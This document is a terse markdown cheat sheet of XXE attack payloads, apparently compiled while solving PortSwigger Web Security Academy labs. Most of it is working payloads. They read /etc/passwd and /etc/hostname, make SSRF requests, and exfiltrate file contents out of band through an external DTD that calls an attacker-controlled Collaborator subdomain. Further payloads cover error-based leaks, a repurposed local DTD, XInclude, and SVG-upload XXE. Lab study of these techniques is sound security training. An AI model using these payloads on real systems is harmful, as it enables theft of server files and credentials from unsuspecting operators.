
# XXE

## NORMAL XXE
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>


## Getting external data using xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.

## 2:XXE to do ssrf
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://sokzuyqem81dc852mp18rpa6vx1npc.burpcollaborator.net"> ]>

## out of band blind xxs

use burpcolaborator to make requests



## Detecting blind XXE using out-of-band (OAST) techniques  * parameterentity
paramter entity are used to enable xml to have one way of calling values

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://s0tlmxl7lfn99oxdlmye4hcykpqge5.burpcollaborator.net"> %xxe; ]>

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-acb21fda1fb5c7a8c0e0733201b400da.web-security-academy.net/exploit"> %xxe; ]>


https://exploit-acb21fda1fb5c7a8c0e0733201b400da.web-security-academy.net/exploit

http://exploit-acb21fda1fb5c7a8c0e0733201b400da.web-security-academy.net/exploit
t5zxriab0q5ykaoflbqer64cf3l59u.burpcollaborator.net
a8jeuzds378fnrrwostvun7tikoncc.burpcollaborator.net

## exfiltrate data in  blind xxe 

site:https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
* Server payload

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;

then make a dtd parameter request
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>


#exfiltrate data via log

https://exploit-acbd1f991fbb071ec0ef961d01a100fc.web-security-academy.net/exploit

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-acbd1f991fbb071ec0ef961d01a100fc.web-security-academy.net/exploit"> %xxe; ]>

##Exploiting blind XXE by repurposing a local DTD

gnome dtd location
/usr/share/yelp/dtd/docbookx.dtd 

start by searching for the local dtd by using
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
</br>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

## Exploiting XInclude to retrieve files
### ref : https://www.w3.org/TR/xinclude-11/

<?xml version='1.0'?>
<document xmlns:xi="http://www.w3.org/2001/XInclude">
  <p>This document is about
  <xi:include href="file:///etc/passwd" parse="text/plain" encoding="ISO-8859-1"/>.</p>
</document>
inject this xml to the product code
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>


Exploiting XXE via image file upload

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
